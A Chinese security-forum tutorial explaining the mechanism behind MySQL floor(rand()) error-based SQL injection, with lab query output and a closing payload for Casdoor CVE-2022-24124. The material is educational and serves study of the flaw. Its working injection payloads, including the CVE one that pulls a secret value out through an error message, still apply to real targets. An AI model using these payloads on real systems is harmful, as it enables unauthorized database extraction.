

# sql注入之floor报错注入原理学习 - 先知社区

sql注入之floor报错注入原理学习

- - -

# Floor报错注入原理学习

> Payload一般长这样
> 
> select count(*) from users group by concat(database(),floor(rand(0)*2));  
> select count(*),concat(database(),floor(rand(0)*2)) as x from users group by x;
> 
> > 结果一般长这样
> > 
> > ERROR 1062 (23000): Duplicate entry 'sqli1' for key 'group\_key'

## 前置

### 创建一个表 那就叫users吧

```plain
mysql> create database sqli;
Query OK, 1 row affected (0.02 sec)

mysql> use sqli;
Database changed

mysql> create table users (id int(3),username varchar(100),password varchar(100));
Query OK, 0 rows affected (0.06 sec)

mysql> desc users;
+----------+--------------+------+-----+---------+-------+
| Field    | Type         | Null | Key | Default | Extra |
+----------+--------------+------+-----+---------+-------+
| id       | int(3)       | YES  |     | NULL    |       |
| username | varchar(100) | YES  |     | NULL    |       |
| password | varchar(100) | YES  |     | NULL    |       |
+----------+--------------+------+-----+---------+-------+
3 rows in set (0.03 sec)
```

### 放几条数据进去

```plain
mysql> insert into users values(1,'admin',md5('123456'));
Query OK, 1 row affected (0.03 sec)

mysql> insert into users values(1,'laolao',md5('12345'));
Query OK, 1 row affected (0.01 sec)

mysql> insert into users values(1,'guairui',md5('12345'));
Query OK, 1 row affected (0.01 sec)

mysql> insert into users values(1,'jiangjiang',md5('12345'));
Query OK, 1 row affected (0.01 sec)

mysql> insert into users values(1,'moss',md5('12345'));
Query OK, 1 row affected (0.01 sec)

mysql> insert into users values(1,'ltpp',md5('12345'));
Query OK, 1 row affected (0.01 sec)
```

## 学学其中的函数

> As

### 1.列的别名

这里用`as`关键字为`id`、`username`和`password`列分别指定了别名`用户ID`、`用户名`、`密码`

```plain
mysql> select id as '用户ID',username as '用户名',password as '密码' from users;
+----------+------------+----------------------------------+
| 用户ID   | 用户名     | 密码                             |
+----------+------------+----------------------------------+
|        1 | admin      | e10adc3949ba59abbe56e057f20f883e |
|        2 | laolao     | 827ccb0eea8a706c4c34a16891f84e7b |
|        3 | guairui    | 827ccb0eea8a706c4c34a16891f84e7b |
|        4 | jiangjiang | 827ccb0eea8a706c4c34a16891f84e7b |
|        5 | moss       | 827ccb0eea8a706c4c34a16891f84e7b |
|        6 | ltpp       | 827ccb0eea8a706c4c34a16891f84e7b |
|        7 | year       | e358efa489f58062f10dd7316b65649e |
+----------+------------+----------------------------------+
7 rows in set (0.00 sec)
```

### 2.表的别名

```plain
mysql> desc employees;
+----------+-------------+------+-----+---------+-------+
| Field    | Type        | Null | Key | Default | Extra |
+----------+-------------+------+-----+---------+-------+
| emp_id   | int(11)     | NO   | PRI | NULL    |       |
| emp_name | varchar(50) | YES  |     | NULL    |       |
| dept_id  | int(11)     | YES  | MUL | NULL    |       |
+----------+-------------+------+-----+---------+-------+
3 rows in set (0.01 sec)

mysql> desc departments;
+-----------+-------------+------+-----+---------+-------+
| Field     | Type        | Null | Key | Default | Extra |
+-----------+-------------+------+-----+---------+-------+
| dept_id   | int(11)     | NO   | PRI | NULL    |       |
| dept_name | varchar(50) | YES  |     | NULL    |       |
+-----------+-------------+------+-----+---------+-------+
2 rows in set (0.01 sec)
```

此处给`dept_name`建立别名`department`，给`employees`、`departments`表分别建立`e`、`d`别名。

#### 内连接 -- INNER JOIN

`ON`是用于指定连接两个表的条件的SQL关键字，通常与`JOIN`一起使用。

```plain
mysql> SELECT e.emp_name, d.dept_name AS department
    -> FROM employees AS e
    -> INNER JOIN departments AS d
    -> ON e.dept_id = d.dept_id;
+-------------+-------------+
| emp_name    | department  |
+-------------+-------------+
| John Smith  | Engineering |
| Lisa Jones  | Marketing   |
| Peter Lee   | Engineering |
| Karen Kim   | Sales       |
| Mike Chen   | Engineering |
| Amy Johnson | Finance     |
+-------------+-------------+
```

where可以实现内连接和on限定条件同样的效果，但并不推荐，因为它可能会形成笛卡尔积以及造成一些不可预测的问题

```plain
mysql> SELECT e.emp_name, d.dept_name
    -> FROM employees AS e, departments AS d
    -> WHERE e.dept_id = d.dept_id;
+-------------+-------------+
| emp_name    | dept_name   |
+-------------+-------------+
| John Smith  | Engineering |
| Lisa Jones  | Marketing   |
| Peter Lee   | Engineering |
| Karen Kim   | Sales       |
| Mike Chen   | Engineering |
| Amy Johnson | Finance     |
+-------------+-------------+
6 rows in set (0.01 sec)
```

#### 自然连接 -- NATURAL JOIN

```plain
mysql> select e.emp_name,d.dept_name FROM employees as e NATURAL JOIN departments as d;
+-------------+-------------+
| emp_name    | dept_name   |
+-------------+-------------+
| John Smith  | Engineering |
| Lisa Jones  | Marketing   |
| Peter Lee   | Engineering |
| Karen Kim   | Sales       |
| Mike Chen   | Engineering |
| Amy Johnson | Finance     |
+-------------+-------------+
6 rows in set (0.00 sec)
```

自然连接与内连接的区别主要在条件的指定上，自然连接不需要指定条件，而内连接需要用ON或USING关键字限定条件。

自然连接会根据两个表中的相通的列进行连接，它的缺点是可能会出现意料之外的结果。

USING连接的优点是可以让连接条件更加简洁明了，但是由于连接条件必须是两个表中的同名列，因此使用USING连接时可能会存在命名冲突的问题。因此，一般情况下建议使用ON连接来指定连接条件。

> floor(rand(0)\*2)

```plain
mysql> select count(*) from users group by concat(database(),floor(rand(0)*2));
ERROR 1062 (23000): Duplicate entry 'sqli1' for key 'group_key'
```

`sqli1`中的1便是来自于floor(rand(0)\*2)，它说`sqli1`重复，那说明之前的表中已经有这个主键了。因为database()固定，我们继续来看下产生'1'的这个floor(rand(0)\*2)

rand()是一个数学函数，它返回一个随机浮点值

```plain
mysql> select rand();
+---------------------+
| rand()              |
+---------------------+
| 0.31095878529451676 |
+---------------------+
1 row in set (0.01 sec)

mysql> select rand();
+--------------------+
| rand()             |
+--------------------+
| 0.8337753562571252 |
+--------------------+
1 row in set (0.01 sec)
```

若指定一个整数参数N，这个N称作种子数（也被叫做随机因子）。rand()会根据这个种子数随机生成来产生重复序列，也就是说在种子数相同时，rand(N)重复计算的值是相同的。

```plain
mysql> select rand(0) from users limit 0,2;
+---------------------+
| rand(0)             |
+---------------------+
| 0.15522042769493574 |
|   0.620881741513388 |
+---------------------+
2 rows in set (0.01 sec)

mysql> select rand(0) from users limit 0,2;
+---------------------+
| rand(0)             |
+---------------------+
| 0.15522042769493574 |
|   0.620881741513388 |
+---------------------+
2 rows in set (0.01 sec)
```

而它后面的\*2，则是选定获取数据的范围\[0,2\]，其实就是乘以2

```plain
mysql> select rand(0)*2 from users limit 0,2;
+--------------------+
| rand(0)*2          |
+--------------------+
| 0.3104408553898715 |
|  1.241763483026776 |
+--------------------+
2 rows in set (0.01 sec)

mysql> select rand(0)*2 from users limit 0,2;
+--------------------+
| rand(0)*2          |
+--------------------+
| 0.3104408553898715 |
|  1.241763483026776 |
+--------------------+
2 rows in set (0.00 sec)
```

floor()同样是一个数学函数，用作向下取整，返回不大于x的最大整数值，比如floor(3.3)返回3，floor(-3.3)返回-4

```plain
mysql> select floor(3.3),floor(-3.3);
+------------+-------------+
| floor(3.3) | floor(-3.3) |
+------------+-------------+
|          3 |          -4 |
+------------+-------------+
1 row in set (0.00 sec)
```

计算users表数据条数的次数，看看floor(rand(0)\*2)的值

```plain
mysql> select floor(rand(0)*2) from users;;
+------------------+
| floor(rand(0)*2) |
+------------------+
|                0 |
|                1 |
|                1 |
|                0 |
|                1 |
|                1 |
|                0 |
+------------------+
7 rows in set (0.01 sec)

mysql> select floor(rand(0)*2) from users;;
+------------------+
| floor(rand(0)*2) |
+------------------+
|                0 |
|                1 |
|                1 |
|                0 |
|                1 |
|                1 |
|                0 |
+------------------+
7 rows in set (0.01 sec)
```

可以看到rand(0)的值确实是固定的。

> concat()

concat是字符串拼接函数，拼接多个字符串，如果字符串中含有NULL则返回NULL

这样来看，concat后的结果应为sqli0或sqli1。

> group by与count(\*)

count(*)是一个聚合函数，返回值的数目。\`*\`通配符表示所有字段。

select count(*) from users与select count(column\_name) from users的区别是count(\\*）不排除NULL，而count(column\_name)将会排除NULL。

```plain
mysql> insert into users values(8,NULL,NULL);
Query OK, 1 row affected (0.02 sec)

mysql> select * from users;
+----+------------+----------------------------------+
| id | username   | password                         |
+----+------------+----------------------------------+
|  1 | admin      | e10adc3949ba59abbe56e057f20f883e |
|  2 | laolao     | 827ccb0eea8a706c4c34a16891f84e7b |
|  3 | guairui    | 827ccb0eea8a706c4c34a16891f84e7b |
|  4 | jiangjiang | 827ccb0eea8a706c4c34a16891f84e7b |
|  5 | moss       | 827ccb0eea8a706c4c34a16891f84e7b |
|  6 | ltpp       | 827ccb0eea8a706c4c34a16891f84e7b |
|  7 | year       | e358efa489f58062f10dd7316b65649e |
|  8 | NULL       | NULL                                 |
+----+------------+----------------------------------+
8 rows in set (0.00 sec)

mysql> select count(*) from users;
+----------+
| count(*) |
+----------+
|        8 |
+----------+
1 row in set (0.00 sec)

mysql> select count(username) from users;
+-----------------+
| count(username) |
+-----------------+
|               7 |
+-----------------+
1 row in set (0.01 sec)
```

先看看现在users表的数据

```plain
mysql> select * from users;
+----+------------+----------------------------------+
| id | username   | password                         |
+----+------------+----------------------------------+
|  1 | admin      | e10adc3949ba59abbe56e057f20f883e |
|  2 | laolao     | 827ccb0eea8a706c4c34a16891f84e7b |
|  3 | guairui    | 827ccb0eea8a706c4c34a16891f84e7b |
|  4 | jiangjiang | 827ccb0eea8a706c4c34a16891f84e7b |
|  5 | moss       | 827ccb0eea8a706c4c34a16891f84e7b |
|  6 | ltpp       | 827ccb0eea8a706c4c34a16891f84e7b |
|  7 | year       | e358efa489f58062f10dd7316b65649e |
|  8 | admin      | c4ca4238a0b923820dcc509a6f75849b |
|  9 | bing       | c81e728d9d4c2f636f067f89cc14862c |
| 10 | admin      | d3d9446802a44259755d38e6d163e820 |
+----+------------+----------------------------------+
10 rows in set (0.01 sec)
```

通过select count(\*) from users group by username;这条语句来了解group by 的工作过程。

```plain
mysql> select count(*) from users group by username;
+----------+
| count(*) |
+----------+
|        3 |
|        1 |
|        1 |
|        1 |
|        1 |
|        1 |
|        1 |
|        1 |
+----------+
8 rows in set (0.01 sec)
```

group by在执行时，会依次取出查询表中的记录并创建一个临时表，group by的参数便是该临时表的主键。

如果临时表中已经存在该主键，则将值+1，如果不存在，则将该主键插入到临时表中，注意是插入！

- - -

第一次取到username->admin，表中没有该主键，则将admin插入到主键，count(\*)值计1

第二次取到username->laolao,表中没有该主键，则将admin插入到主键，count(\*)值计1

...

当取到原表中第八条admin时，同样将admin作为主键插入到临时表中，并将count(\*)计1

当取到第十条admin时，发现临时表中已经有admin作为主键了，则直接count(\*)加1

- - -

可视化如下

```plain
mysql> CREATE TABLE temp_table
    -> SELECT username as 'key',count(*) from users group by username;
Query OK, 8 rows affected (0.05 sec)
Records: 8  Duplicates: 0  Warnings: 0

mysql> select * from temp_table;
+------------+----------+
| key        | count(*) |
+------------+----------+
| admin      |        3 |
| bing       |        1 |
| guairui    |        1 |
| jiangjiang |        1 |
| laolao     |        1 |
| ltpp       |        1 |
| moss       |        1 |
| year       |        1 |
+------------+----------+
8 rows in set (0.01 sec)
```

A：那为什么不是这个结果，反而报了主键重复的错误呢？

Q：因为还有一个最重要的特性，就是group by和rand()使用时，如果临时表中没有改主键，则在插入前rand()会再计算一次（也就是两次，也有说多次的）。就是这个特性导致了主键重复并报错。

> Payload的执行流

```plain
mysql> SELECT count(*)
    -> from users
    -> GROUP BY
    -> concat(database(),floor(rand(0)*2));
ERROR 1062 (23000): Duplicate entry 'sqli1' for key 'group_key'
```

在payload的执行中，当`group by`取第一条`from`表记录时，此时`group by`的是`sqli0`，发现临时表中并没有`sqli0`的主键，注意这个时候，`rand(0)*2`会再计算一次，经`floor()`后，率先插入临时表的主键不是`sqli0`，而是`sqli1`，并计数`1`

| 记录  | Key | Count(\*) | floor(rand(0)\*2) |
| --- | --- | --- | --- |
|     | Sqli0 | 0   | 0   |
| 1   | Sqli1 | 0   | 1   |
|     | Sqli1 | 1   | 1   |
| 2   | Sqli0 | 1   | 0   |
|     | Sqli1 | 2   | 1   |
| 3   | sqli1 | 3   | 1   |
|     | sqli0 | 2   | 0   |
| 4   | sqli0 | 3   | 0   |
|     | sqli1 | 4   | 1   |
| 5   | sqli1 | 5   | 1   |

继续从from的表中取第三条记录，再次计算floor(rand(0)*2)，结果为0，与database()拼接为sqli0，临时表的主键中并不存在，在插入前，floor(rand(0)*2)又计算一次，拼接后与sqli1，但是是直接插入，即使临时表中已经有了主键sqli1也硬要插入，从而导致主键重复报错，也就是：ERROR 1062 (23000): Duplicate entry (条目) 'sqli1' for key 'group\_key'。

> 优化

Floor(rand(0)\*2)的值为011011... 但其实第三次计算的结果我们已经不需要了，如果没有floor(rand(x)\*2)满足0101或1010，那么from的表中有两条数据就是可以报错的。

经过多次实验，发现floor(rand(14)\*2)的值为1010000...,那么我们创建一个只有两条数据的表试一下看看

```plain
mysql> select * from test;
+------+-------+------------+
| id   | name  | tel        |
+------+-------+------------+
|    1 | test  | 1111111111 |
|    2 | test2 |  222222222 |
+------+-------+------------+
2 rows in set (0.01 sec)

mysql> select count(*) from test group by concat(database(),floor(rand(0)*2));
+----------+
| count(*) |
+----------+
|        2 |
+----------+
1 row in set (0.01 sec)

mysql> select count(*) from test group by concat(database(),floor(rand(14)*2));
ERROR 1062 (23000): Duplicate entry 'sqli0' for key 'group_key'
```

也就是说在实际渗透中，报错注入使用floor(rand(14)\*2)会比rand(0)效果要好。

而且如果说表中只存在一条数据，那这个时候报错注入就没法使用了，毕竟只有一条数据也不可能发生主键重复报错。

> 最后

### 对floor报错注入原理的学习缘起于casdoor-CVE-2022-24124注入漏洞payload复现的疑惑

```plain
/api/get-organizations? p=1&pageSize=10&value=e99nb&sortField=&sortOrder=&field=(select 123 from (select count (*), concat ((select (value) from flag limit 1),'~', floor (rand (14)*2)) x from (select 1 union all select 2) as t group by x) x)
```

参考文献：

[https://www.freebuf.com/articles/web/257881.html](https://www.freebuf.com/articles/web/257881.html)  
%% %% %% %%
